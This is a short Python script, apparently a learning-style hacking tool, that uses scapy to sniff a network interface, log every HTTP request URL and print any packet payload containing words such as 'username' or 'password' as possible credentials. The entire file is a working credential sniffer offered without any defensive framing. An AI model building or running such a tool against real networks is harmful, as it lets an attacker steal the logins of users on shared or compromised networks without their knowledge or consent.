#!/user/bin/env python

import argparse
import scapy.all as scapy
from scapy.layers import http


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to be sniffed")
    options = parser.parse_args()
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)


def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "pw"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTPRequest >> " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")


options = get_argument()
sniff(options.interface)
